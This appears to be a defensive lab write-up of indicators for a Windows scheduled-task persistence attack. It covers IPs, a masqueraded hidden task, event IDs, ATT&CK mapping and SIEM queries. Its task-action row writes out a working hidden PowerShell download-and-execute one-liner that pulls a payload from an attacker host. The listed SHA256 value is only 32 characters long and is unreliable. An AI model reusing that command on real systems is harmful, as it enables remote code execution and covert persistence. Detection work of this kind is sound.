# 04 — Indicators (IOCs, actual)

## Network

| Indicator | Value |
|---|---|
| Attacker IP | `192.168.100.106` (BUTCH) |
| Target IP | `192.168.100.108` (winhome01 / DESKTOP-F0JVTQT) |
| Payload URL | `http://192.168.100.106/payload.ps1` |

## Task IOCs (the persistence object)

| Indicator | Value |
|---|---|
| Task name | `\MicrosoftEdgeUpdateTask` (masquerades as Edge update — T1036) |
| Task file | `C:\Windows\System32\Tasks\MicrosoftEdgeUpdateTask` |
| Run as | `NT AUTHORITY\SYSTEM` |
| Schedule | Every 5 minutes (PT5M, TimeTrigger) |
| Hidden | **true** (`<Hidden>true</Hidden>` in XML) |
| Action / command | `powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.106/payload.ps1')"` |
| Creation method | `schtasks.exe /create` (32-bit, SysWOW64) from psexec-spawned `cmd.exe` |

## Process / hash IOCs (Sysmon Event ID 1)

| Indicator | Value |
|---|---|
| Image | `C:\Windows\SysWOW64\schtasks.exe` |
| Parent | `C:\Windows\SysWOW64\cmd.exe` (psexec) |
| User | NT AUTHORITY\SYSTEM |
| SHA1 | `A8EEA4CAB549C87F6BB90EB2AE4012037B8BD221` |
| MD5 | `48C2FE20575769DE916F48EF0676A965` |
| SHA256 | `910DBB011811BFA116422CA95202D8F5` |
| psexec artifacts | uploaded `TVMxBfgf.exe`, service `rPEs` (impacket default random names) |

## Event IDs observed

| Event ID | Source | Meaning | Count |
|---|---|---|---|
| **4698** | Security (Microsoft-Windows-Security-Auditing) | Scheduled task created | 2 |
| **1** | Microsoft-Windows-Sysmon/Operational | schtasks.exe process create (full cmd line + hashes) | 1+ |
| **11** | Microsoft-Windows-Sysmon/Operational | Task file created in System32\Tasks\ | 1 |

## ATT&CK mapping

- T1053.005 — Scheduled Task (Sysmon ruleName tag on both Event 1 and 11)
- T1036 — Masquerading (task name mimics Edge update)
- T1105 — Ingress Tool Transfer (IEX DownloadString payload)
- T1564.003 — Hidden Window (`-w hidden`); task itself Hidden=true
- T1059.001 — PowerShell (task action)

## SIEM queries (DQL, verified)

```
data.win.system.eventID: 4698
data.win.system.eventID: 1 and data.win.eventdata.image: "*schtasks.exe*"
data.win.system.eventID: 11 and data.win.eventdata.targetFilename: "*MicrosoftEdgeUpdateTask*"
data.win.eventdata.taskName: "*EdgeUpdate*" or data.win.eventdata.commandLine: "*schtasks*create*"
```

## Behavioral signature

`schtasks /create` (32-bit, from psexec cmd, as SYSTEM) → 4698 with task name containing "Update" but task action containing `powershell -nop -w hidden IEX DownloadString` → Sysmon 11 file write to System32\Tasks\ → task runs every 5 min. Masqueraded name + hidden + SYSTEM + suspicious action = malicious persistence.
